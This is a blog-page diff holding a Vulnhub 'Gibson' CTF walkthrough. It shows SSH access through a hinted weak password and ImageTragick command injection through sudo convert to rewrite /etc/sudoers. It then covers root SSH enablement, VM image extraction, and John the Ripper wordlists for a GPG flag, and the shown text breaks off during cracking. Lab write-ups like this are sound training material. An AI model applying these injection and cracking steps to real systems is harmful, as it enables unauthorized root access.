@@ -1,0 +1,974 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Gibson 0.2 walkthrough - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="Gibson 0.2 writeup">
+  <meta name="keywords" content="gibson, gibson 0.2, gibson vulnhub, gibson writeup, gibson ctf, gibson walkthrough, gibson solution, gibson 0.2 vm">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Gibson 0.2 walkthrough</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-10-28T16:10:23-04:00" pubdate data-updated="true">Oct 28<span>th</span>, 2017</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>The Vulnhub machine I picked for today&rsquo;s target is called Gibson. For this challenge, there are also some hints:</p>
+
+<ul>
+<li>SSH can forward X11.</li>
+<li>The challenge isn&rsquo;t over with root. The flag is not where you expect to find it.</li>
+</ul>
+
+
+<p>Let&rsquo;s see what Gibson has in store for us!</p>
+
+<!-- more -->
+
+
+<h2>Recon</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>| ssh-hostkey: 
+</span><span class='line'>|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
+</span><span class='line'>|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
+</span><span class='line'>|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7
+</span><span class='line'>| http-ls: Volume /
+</span><span class='line'>| SIZE  TIME              FILENAME
+</span><span class='line'>| 273   2016-05-07 13:03  davinci.html
+</span><span class='line'>|_
+</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
+</span><span class='line'>|_http-title: Index of /</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>Looks like we only have SSH and a web server running on this box. The Gibson Mining Corporation page contains a  davinci.html file with a bolded message: <code>The answer you seek will be found by brute force</code>. And the page source also has an interesting comment:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- Damn it Margo! Stop setting your password to "god" --&gt;
+</span><span class='line'>&lt;!-- at least try and use a different one of the 4 most --&gt;
+</span><span class='line'>&lt;!-- common ones! (eugene) --&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With this information in hand, I tried SSH&#8217;ing as Margo with password god. That didn&rsquo;t work, but doing it as margo instead got me in. We have a shell on the box already!</p>
+
+<h2>Privilege escalation</h2>
+
+<p>We&rsquo;re in as margo, but we need root. I ran my <a href="https://github.com/chousensha/linux_privcheck">linux_pricheck script</a> and sifted through the output to see what might be helpful. Some of the discoveries:</p>
+
+<ul>
+<li>there is a network interface connected to a different subnet:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>virbr0    Link encap:Ethernet  HWaddr fe:54:00:72:e2:fb  
+</span><span class='line'>          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
+</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</span><span class='line'>          RX packets:7 errors:0 dropped:0 overruns:0 frame:0
+</span><span class='line'>          TX packets:17 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class='line'>          collisions:0 txqueuelen:0 
+</span><span class='line'>          RX bytes:1347 (1.3 KB)  TX bytes:2459 (2.4 KB)</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>VNC is running on the localhost:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               </span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>user marvo has some sudo privileges that need to be checked out:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>User margo may run the following commands on gibson:
+</span><span class='line'>    (ALL) NOPASSWD: /usr/bin/convert</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>other users on the host are duke and eugene</li>
+</ul>
+
+
+<p>Alright, we have a solid start. First thing I did was check that convert binary:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>margo@gibson:~$ /usr/bin/convert
+</span><span class='line'>Version: ImageMagick 6.7.7-10 2014-03-06 Q16 http://www.imagemagick.org
+</span><span class='line'>Copyright: Copyright (C) 1999-2012 ImageMagick Studio LLC
+</span><span class='line'>Features: OpenMP    
+</span><span class='line'>
+</span><span class='line'>Usage: convert [options ...] file [ [options ...] file ...] [options ...] file
+</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ImageMagick? More like <a href="https://www.exploit-db.com/exploits/39767/">ImageTragick</a>. This particular version of the ImageMagick library is vulnerable to command execution due to insufficient filtering in shell characters.</p>
+
+<blockquote><p>Insufficient filtering for filename passed to delegate&rsquo;s command allows
+remote code execution during conversion of several file formats.</p>
+
+<p>ImageMagick allows to process files with external libraries. This
+feature is called &lsquo;delegate&rsquo;. It is implemented as a system() with command string (&lsquo;command&rsquo;)</p>
+
+<p>One of the default delegate&rsquo;s command is used to handle https requests:</p>
+
+<p>&ldquo;wget&rdquo; -q -O &ldquo;%o&rdquo; &ldquo;<a href="https:%M">https:%M</a>&rdquo;</p>
+
+<p>Due to insufficient %M param filtering it is possible to conduct shell command injection, where %M is the actual
+link from the input. It is possible to pass the value like <code>https://example.com"|ls "-la</code> and
+execute unexpected &lsquo;ls -la&rsquo;. (wget or curl should be installed)</p></blockquote>
+
+<p>So, the injection would look like this:</p>
+
+<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"&rsquo; tragic.png</code></p>
+
+<p>And if the command takes arguments:</p>
+
+<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"-flags&rsquo; tragic.png</code></p>
+
+<p>Of course, you are not limited to the pipe character. You can also use <strong>;</strong>.</p>
+
+<p>Since the convert binary runs with sudo privileges, it is possible to escalate privileges by editing <strong>/etc/sudoers</strong>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>margo@gibson:~$ sudo /usr/bin/convert 'https://dummyurl";vim /etc/sudoers"' tragic.png</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The sudoers file will pop up in vim, and I gave full access to margo:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># User privilege specification
+</span><span class='line'>root    ALL=(ALL:ALL) ALL
+</span><span class='line'>
+</span><span class='line'>margo    ALL=(ALL:ALL) ALL</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Also, some other interesting tidbits in the the sudoers file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Allow members of group sudo to execute any command
+</span><span class='line'>## disabled after Margo's security incident
+</span><span class='line'>##%sudo ALL=(ALL:ALL) ALL
+</span><span class='line'>
+</span><span class='line'># Allow Margo to convert pictures from the FTP server
+</span><span class='line'>margo ALL=(ALL) NOPASSWD: /usr/bin/convert
+</span><span class='line'># Allow eugene to manage virtual machines and visudo
+</span><span class='line'>eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager
+</span><span class='line'>eugene ALL=(ALL:ALL)  /usr/sbin/visudo</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I quit vim with <code>:wq!</code> to override the warning I got. The convert binary throws some errors, but the code was executed!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>convert: unable to open image `/tmp/magick-AJXBjcDc': No such file or directory @ error/blob.c/OpenBlob/2638.
+</span><span class='line'>convert: unable to open file `/tmp/magick-AJXBjcDc': No such file or directory @ error/constitute.c/ReadImage/583.
+</span><span class='line'>convert: no images defined `tragic.png' @ error/convert.c/ConvertImageCommand/3044.
+</span><span class='line'>margo@gibson:~$ sudo su
+</span><span class='line'>[sudo] password for margo: 
+</span><span class='line'>root@gibson:/home/margo# </span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>From the system recon we performed, we know there is a VM running on the host. I re-ran my SSH connection with the <strong>-X</strong> flag to enable X11 forwarding, because I wanted to use virt-manager to take a look at the VM. However, I got an error: <code>X11 connection rejected because of wrong authentication</code>. Not a problem, we have virsh!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@gibson:~# virsh list --all
+</span><span class='line'> Id    Name                           State
+</span><span class='line'>----------------------------------------------------
+</span><span class='line'> 2     ftpserv                        running</span></code></pre></td></tr></table></div></figure>
+
+
+<p>At this point, I wanted to make things easier for me, so I decided to get the VM to my own system and continue from there. I located the VM:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls /var/lib/libvirt/images/
+</span><span class='line'>ftpserv.img</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To transfer the VM using scp, I first needed to enable SSH&#8217;ing as root. I edited <code>/etc/ssh/sshd_config</code> to have the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PermitRootLogin yes 
+</span><span class='line'>AllowUsers eugene margo root
+</span><span class='line'>Match user root
+</span><span class='line'>    PasswordAuthentication yes</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I changed root&rsquo;s password, and reloaded the SSH config file with <code>service ssh reload</code>. Now I was able to transfer the image:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>scp root@192.168.217.148:/var/lib/libvirt/images/ftpserv.img /mnt/ftpserv.img
+</span><span class='line'>Ubuntu 14.04.3 LTS
+</span><span class='line'>root@192.168.217.148's password: 
+</span><span class='line'>ftpserv.img                                   100%  512MB  22.6MB/s   00:22    </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s see what we have here:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>file ftpserv.img 
+</span><span class='line'>ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To mount it, we need to learn the offset:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>fdisk -l ftpserv.img 
+</span><span class='line'>Disk ftpserv.img: 512 MiB, 536870912 bytes, 1048576 sectors
+</span><span class='line'>Units: sectors of 1 * 512 = 512 bytes
+</span><span class='line'>Sector size (logical/physical): 512 bytes / 512 bytes
+</span><span class='line'>I/O size (minimum/optimal): 512 bytes / 512 bytes
+</span><span class='line'>Disklabel type: dos
+</span><span class='line'>Disk identifier: 0x00000000
+</span><span class='line'>
+</span><span class='line'>Device       Boot Start     End Sectors   Size Id Type
+</span><span class='line'>ftpserv.img1 *       63 1048319 1048257 511.9M  e W95 FAT16 (LBA)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So the start block is 63 and the block size is 512..then the offset is 63 * 512, or 32256. Time to mount the image:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt# mkdir ftpserv
+</span><span class='line'>mount -o loop,offset=32256 ftpserv.img ftpserv</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Mounting is done via the loop device, which is a file that acts as a block-based device. Now, a new device called KFLYNN appeared on my system. Kevin Flynn, maybe? Anyway, let&rsquo;s look inside:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls ftpserv
+</span><span class='line'>AUTOEXEC.BAT  COMMAND.COM  FDCONFIG.SYS  KERNEL.SYS
+</span><span class='line'>BOOTSECT.BIN  DOS          GARBAGE       net</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The GARBAGE directory seems interesting:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls GARBAGE/
+</span><span class='line'>adminspo.jpg  flag.img  jz_ug.ans</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s see the picture first:</p>
+
+<p><img class="center" src="/images/pentest/gibson/adminspo.jpg" title="sysadmin" alt="sysadmin life"></p>
+
+<p>I also ran exiftool on it and was rewarded with..something:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>exiftool adminspo.jpg 
+</span><span class='line'>ExifTool Version Number         : 10.60
+</span><span class='line'>File Name                       : adminspo.jpg
+</span><span class='line'>Directory                       : .
+</span><span class='line'>File Size                       : 120 kB
+</span><span class='line'>File Modification Date/Time     : 2016:05:04 17:17:44-04:00
+</span><span class='line'>File Access Date/Time           : 2017:10:01 15:14:34-04:00
+</span><span class='line'>File Inode Change Date/Time     : 2016:05:04 17:31:08-04:00
+</span><span class='line'>File Permissions                : rwxr-xr-x
+</span><span class='line'>File Type                       : JPEG
+</span><span class='line'>File Type Extension             : jpg
+</span><span class='line'>MIME Type                       : image/jpeg
+</span><span class='line'>Exif Byte Order                 : Big-endian (Motorola, MM)
+</span><span class='line'>Image Description               : Rabbit.. Flu Shot... TYPE COOKE YOU IDIOT! I'll head them off at the pass
+</span><span class='line'>Modify Date                     : 2016:05:04 22:29:32
+</span><span class='line'>Artist                          : Virtualization is fun.. What's more, esoteric OSes on 192.168.122 are even more fun
+</span><span class='line'>User Comment                    : So there's info here.... Images, hmm... Wasn't that a CVE...? Oh yes... CVE 2016-3714....http://www.openwall.com/lists/oss-security/2016/05/03/18 so which person can run it. Perhaps the man who knew a lot about Sean Connery in Trainspotting when he wasn't  causing a 7 point drop in the NYSE
+</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next I looked at the ANS file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>file jz_ug.ans 
+</span><span class='line'>jz_ug.ans: ISO-8859 text, with CRLF line terminators, with escape sequences</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Apparently, this type of file is a text document graphic based on the ANSI text standard; may also be used to store text graphics, which uses characters to display images in a text document. I read it like a text file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat jz_ug.ans 
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>   �������ݲܱ����ܲ����۲ܱ�������������ܲ�ܲ������������ܲ�ܱ��ܲ�ܱ����
+</span><span class='line'>    �����������������������������������������������������۲���������������
+</span><span class='line'>    �������������������������۲���������� ��������۲�����۲���������������
+</span><span class='line'>    ���������������������������������������������������� �����������������
+</span><span class='line'>    ޲���������۲�����۲�����������    �����۲���    ����������߲������۲�
+</span><span class='line'>     ��߱� ����������߲����������߲    �����߲���    ����߲���߲��ݲ����߲jz
+</span><span class='line'>                                  �                            �         �
+</span><span class='line'>                    the ugliest of all are under 5 feet tall</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Hmm, ok. Finally, another image file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>file flag.img 
+</span><span class='line'>flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This time it&rsquo;s an EXT2 filesystem. I mounted it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mount ftpserv/GARBAGE/flag.img flag
+</span><span class='line'>ls -la
+</span><span class='line'>total 70
+</span><span class='line'>drwxr-xr-x 4 root root  1024 May 14  2016 .
+</span><span class='line'>drwxr-xr-x 5 root root  4096 Oct 28 13:05 ..
+</span><span class='line'>-rwxrwxr-x 1 root root 21358 Nov 15  2011 davinci
+</span><span class='line'>-rw-r--r-- 1 root root 28030 Nov 15  2011 davinci.c
+</span><span class='line'>-rw-r--r-- 1 root root   159 May  5  2016 hint.txt
+</span><span class='line'>drwx------ 2 root root 12288 May  5  2016 lost+found
+</span><span class='line'>drwxr-xr-x 2 root root  1024 May  5  2016 .trash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Davinci is a snake game:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>     _________         _________             
+</span><span class='line'>     /         \       /         \            
+</span><span class='line'>    /  /~~~~~\  \     /  /~~~~~\  \           
+</span><span class='line'>    |  |     |  |     |  |     |  |           
+</span><span class='line'>    |  |     |  |     |  |     |  |           
+</span><span class='line'>    |  |     |  |     |  |     |  |         / 
+</span><span class='line'>    |  |     |  |     |  |     |  |       //  
+</span><span class='line'>   (o  o)    \  \_____/  /     \  \_____/ /   
+</span><span class='line'>    \__/      \         /       \        /    
+</span><span class='line'>      |        ~~~~~~~~~         ~~~~~~~~         
+</span><span class='line'>      ^                               
+</span><span class='line'>      Welcome To The Snake Game!          
+</span><span class='line'>              Press Any Key To Continue...    
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Its source code hints that it&rsquo;s vulnerable to buffer overflow if more than 128 characters are entered. Let&rsquo;s look at the hint now:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat hint.txt 
+</span><span class='line'>http://www.imdb.com/title/tt0117951/ and
+</span><span class='line'>http://www.imdb.com/title/tt0113243/ have
+</span><span class='line'>someone in common... Can you remember his
+</span><span class='line'>original nom de plume in 1988...?</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The IMDB references are for the movies Trainspotting and Hackers. And who do they have in common? Jonny Lee Miller. You can find the name referenced in the hint by reading the description for the Hackers movie. It&rsquo;s a handle: Zero Cool.</p>
+
+<p>And finally, the hidden directory:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l
+</span><span class='line'>total 317
+</span><span class='line'>---x------ 1 root root    469 May 14  2016 flag.txt.gpg
+</span><span class='line'>-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The image is an ad for Trainspotting and has nothing out of the ordinary in the exiftool output. And, of course, the best for last! It seems we have a flag, but it&rsquo;s encrypted. I tried some ZeroCool variations, but it seems more calculation power will need to be thrown at this. I made a file with the handle to be transformed in many possible passwords by John:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat tries.txt 
+</span><span class='line'>zero cool
+</span><span class='line'>zerocool
+</span><span class='line'>zero kool
+</span><span class='line'>zerokool</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next I used John to generate a file of uppercase and lowercase combinations from this initial file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>john --rules=nt --wordlist=tries.txt --stdout &gt; pass.txt
+</span><span class='line'>Created directory: /root/.john
+</span><span class='line'>Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class='line'>1504p 0:00:00:01 100.00% (2017-10-28 13:37) 1139p/s ZERO KOOL</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And after so many hacker references, also add l33t speak to the combinations, with Korelogic rules. First, download the rules file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget http://openwall.info/wiki/_media/john/korelogic-rules-20100801.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now add the rules to John&rsquo;s config file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat korelogic-rules-20100801.txt &gt;&gt; /etc/john/john.conf</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now I was able to generate the file with p@$$w0rd$:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>john --rules=KoreLogicRulesL33t --wordlist=pass.txt --stdout &gt; coolpass.txt
+</span><span class='line'>Press 'q' or Ctrl-C to abort, almost any other key for status
